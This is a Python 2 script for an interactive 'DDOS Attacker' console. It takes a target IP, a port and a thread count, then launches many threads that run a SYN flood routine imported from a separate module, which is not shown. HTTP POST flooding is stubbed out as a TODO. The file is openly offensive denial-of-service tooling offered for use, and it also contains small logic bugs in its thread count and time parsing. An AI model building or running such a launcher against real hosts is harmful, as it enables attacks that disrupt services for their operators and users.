import threading
import socket
from synflood import *

def getArgs(words):
    iN = words.index('-n') + 1
    int(words[iN])

    iPort = words.index('-port') + 1
    int(words[iPort])

    iIP = words.index('-ip') + 1
    socket.inet_aton(words[iIP])

    return (words[iN], words[iPort], words[iIP])

def startSynFlood((nThreads, portDest, ipDest), synEvent):
    for i in range(1, int(nThreads)):
        t = threading.Thread(target = synFlood, \
                             args = (i, portDest, ipDest, synEvent))
        t.start()
    print ">>> %s threads are attacking using SYN Flood." % (i)

# TODO: startHttpPost

synEvent = threading.Event()
httpEvent = threading.Event()

def init_screen():
    print "===== Welcome to DDOS Attacker====="
    print "Please command your attack or try --help for more information"

    while 1:
        line = raw_input("> ")
        line = line.lower()
        words = line.split(' ')

        if len(words) < 1:
            print "Invalid command. For more information, try --help"
            continue

        if '--help' in words:
            print "Please inform <attack type> <flags>"
            print "\nValid attack types:"
            print "    syn-flood"
            print "    http-post"
            print "\n Compulsory flags to begin an attack:"
            print "    -port <[int] destination port>"
            print "    -ip <[ipv4] destination ip>"
            print "    -n <[int] number of attacking units>"
            print "\n Necessary flags:"
            print "    -start"
            print " or"
            print "    -stop"
            print " or"
            print "    -time <[int] attack period in ms>"
            continue
        elif 'exit()' in words:
            break
        elif ('syn-flood' not in words) & ('http-post' not in words):
            print "Invalid command. For more information, try --help"
            continue
        elif (('-start' in words) | ('-time' in words)) & \
             (('-port' not in words) | ('-ip' not in words) | ('-n' not in words)):
            print "Missing compulsory flag(s)"
            continue

        if '-start' in words:
            try:
                args = getArgs(words)
                if 'syn-flood' in words:
                    synEvent.set()
                    startSynFlood(args, synEvent)
            except ValueError:
                print "Invalid compulsory flag(s)"
                continue
        elif '-stop' in words:
            # TODO: dar join nas threads que morreram PARA CEIFAR OS ZUMBIS
            if 'syn-flood' in words:
                synEvent.clear();
            else:
                httpEvent.clear();
        elif '-time' in words:
            i = words.index('-time')
            try:
                print "-time %s" % (int(words[i]))
            except ValueError:
                print "Invalid time value. For more information, try --help"
        else:
            print "Missing necessary flag. For more information, try --help"

if __name__ == '__main__':
    init_screen()
